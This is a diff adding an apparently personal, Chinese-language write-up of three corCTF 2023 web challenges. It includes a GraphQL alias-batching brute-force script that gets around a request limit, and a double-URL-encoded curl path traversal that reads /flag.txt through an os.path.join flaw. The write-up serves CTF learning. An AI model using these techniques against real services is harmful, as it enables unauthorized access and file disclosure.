@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>corCTF 2023 &mdash; CTF 0.0 documentation</title>
+      <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="prev" title="nullcon HackIM CTF" href="nullcon-HackIM-CTF-Goa.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            CTF
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">CTF</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="Lexington-Informatics-Tournament.html">Lexington Informatics Tournament CTF 2023</a></li>
+<li class="toctree-l1"><a class="reference internal" href="tamu.html">TAMUctf 2023</a></li>
+<li class="toctree-l1"><a class="reference internal" href="nullcon-HackIM-CTF-Goa.html">nullcon HackIM CTF</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">corCTF 2023</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#id1">前言</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#web">WEB</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#force"><strong>force</strong></a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id2">题目分析</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#msfrognymize">msfrognymize</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id3">题目分析</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#frogshare">frogshare</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id4">题目分析</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">CTF</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">corCTF 2023</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/source/2023/corCTF.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="corctf-2023">
+<h1>corCTF 2023<a class="headerlink" href="#corctf-2023" title="Permalink to this heading"></a></h1>
+<section id="id1">
+<h2>前言<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h2>
+<p>比赛地址：<a class="reference external" href="https://2023.cor.team/challs">Challenges | corCTF 2023</a></p>
+<p>discord：<a class="reference external" href="https://discord.com/channels/835621507576496129/835894191245885471">(851) Discord | #announcements | corCTF</a></p>
+</section>
+<section id="web">
+<h2>WEB<a class="headerlink" href="#web" title="Permalink to this heading"></a></h2>
+<section id="force">
+<h3><strong>force</strong><a class="headerlink" href="#force" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>Unbreakable vault door!</p>
+<section id="id2">
+<h4>题目分析<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h4>
+<p>有点像是一个 graphql 注入的题目，但是随后我仔细看了一下，题目就是让我们传入一个变量，然后如果这个变量和 secret 相等就可以获得 flag。secret 是一个位于 0 到 $10^5$ 之间的数字。朴素的想法是直接爆破，但是题目限制了请求数只有10次，感觉还是只能注入来做。</p>
+<p>对于 graphql 我也不甚了解，所以找了一篇文章阅读，读完之后在看这个题有点想法了。题目虽然仅对 flag查询进行了定义，但是我们可以利用 graphQL 的内省自检机制来进行额外的查询，比如通过 _schema 查询所有可用对象：</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span>{
+
+        __schema {
+
+            types {
+
+                name
+
+            }
+
+        }
+
+    }
+</pre></div>
+</div>
+<p>不过这也不重要，后续发现题目不让 mutation啥的，还是只能查询。我想到在一次请求中进行多个查询，每个查询我都猜测一次 secret，这样就可以完美解决问题。注意到一次请求多个查询要用到 graphql 的别名，总之 payload 大概长下面这样子：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">query</span><span class="p">{</span>
+ <span class="n">test1</span><span class="p">:</span> <span class="n">flag</span><span class="p">(</span><span class="n">pin</span><span class="p">:</span> <span class="mi">1</span><span class="p">)</span>
+ <span class="n">test2</span><span class="p">:</span> <span class="n">flag</span><span class="p">(</span><span class="n">pin</span><span class="p">:</span> <span class="mi">2</span><span class="p">)</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>现在编写脚本发送查询请求吧。这个脚本最后的响应有点奇怪啊….</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://web-force-force-e9457753573288eb.be.ax&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Content-Type&quot;</span> <span class="p">:</span> <span class="s2">&quot;text/plain;charset=UTF-8&quot;</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>  <span class="c1"># 得分成10次来发，毕竟一个HTTP请求的长度是有限制滴</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">10</span><span class="o">**</span><span class="mi">4</span><span class="p">,</span><span class="n">i</span><span class="o">*</span><span class="mi">10</span><span class="o">**</span><span class="mi">4</span><span class="o">+</span><span class="mi">10</span><span class="o">**</span><span class="mi">4</span><span class="p">):</span>
+            <span class="n">data</span><span class="p">[</span><span class="s2">&quot;t&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)]</span> <span class="o">=</span> <span class="s2">&quot;flag(pin: </span><span class="si">{}</span><span class="s2">)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+
+        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="n">ans</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="n">ans1</span> <span class="o">=</span> <span class="n">ans</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ans1</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
+            <span class="k">if</span> <span class="s2">&quot;cor&quot;</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+
+</pre></div>
+</div>
+<p><img alt="image-20230824094516415" src="../../_images/image-20230824094516415.png" /></p>
+<p>这一大串空格是怎么回事。。</p>
+</section>
+</section>
+<section id="msfrognymize">
+<h3>msfrognymize<a class="headerlink" href="#msfrognymize" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>At CoR we care greatly about privacy (especially FizzBuzz). For this reason we anonymize any selfies before sharing them on Discord. We even encrypt the metadata using a special key!</p>
+<section id="id3">
+<h4>题目分析<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
+<p>超级大的附件，超级多的源码！让我们跟随gpt的脚本，一步步梳理题目的业务逻辑，并尝试找出漏洞。基本看完了，给我的感觉就是很多起到辅助作用的源码，主要的逻辑还是在app.py中。我们可以上传图片，然后服务端应该会对上传的图片进行人脸识别并打码。</p>
+<p>服务端有一个获取上传图片的 exif 数据的功能，随后用 flag作为密钥对这些 exif 数据进行了哈希签名。这些 exif 数据之后应该会附着到返回给我们的图片中，所以或许可以对得到的图片进行分析，这样可以拿到哈希值，不过 flag 是对应的密钥，好像没办法求逆？</p>
+<p>emmm，草率了，其实题目很简单，就考察了一下对 os.path.join 函数缺陷。具体地说，当 join 函数的第二个参数是绝对路径的时候，会忽略掉第一个参数。</p>
+<p><img alt="image-20230824212852488" src="../../_images/image-20230824212852488.png" /></p>
+<p>如果要读取 /flag.txt 呢？改成下图就好了：</p>
+<p><img alt="image-20230824212913790" src="../../_images/image-20230824212913790.png" /></p>
+<p>那看起来 payload 应该长下面这样子：</p>
+<div class="highlight-http notranslate"><div class="highlight"><pre><span></span>https://msfrognymize.be.ax/anonymized//flag.txt
+</pre></div>
+</div>
+<p>斜杠是特殊字符，要 url 编码，另外服务端又额外解码了一次，所以要二次 url 编码。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">--</span><span class="n">path</span><span class="o">-</span><span class="k">as</span><span class="o">-</span><span class="ow">is</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">msfrognymize</span><span class="o">.</span><span class="n">be</span><span class="o">.</span><span class="n">ax</span><span class="o">/</span><span class="n">anonymized</span><span class="o">/%</span><span class="mi">252</span><span class="n">Fflag</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="o">--</span><span class="n">path</span><span class="o">-</span><span class="k">as</span><span class="o">-</span><span class="ow">is</span> <span class="n">保持</span> <span class="n">URL</span> <span class="n">中的路径部分不被自动编码或解析</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="frogshare">
+<h3>frogshare<a class="headerlink" href="#frogshare" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>Welcome to Frogshare, the hoppiest place to share your beloved amphibians with fellow frog fanatics! But hold on to your lily pads, our admin reviews your content before its published…</p>
+<p><a class="reference external" href="https://frogshare.be.ax/">frogshare.be.ax</a></p>
+<p>Please inform our admin once you shared a frog: <a class="reference external" href="https://adminbot.be.ax/web-frogshare">Admin Bot</a></p>
+<section id="id4">
+<h4>题目分析<a class="headerlink" href="#id4" title="Permalink to this heading"></a></h4>
+<p>看题目描述就感觉像XSS，不过具体还是得看源码。</p>
+<p>源码又好多啊，甚至不知道从哪里入手。抓包看到一个 /api/frogs 路由，搜了一下又没有。好困。。。</p>
+<p>我有点不太懂为什么题目的目录结构能够和路由路径对应上，在哪里进行了这个配置呢？</p>
+</section>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="nullcon-HackIM-CTF-Goa.html" class="btn btn-neutral float-left" title="nullcon HackIM CTF" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
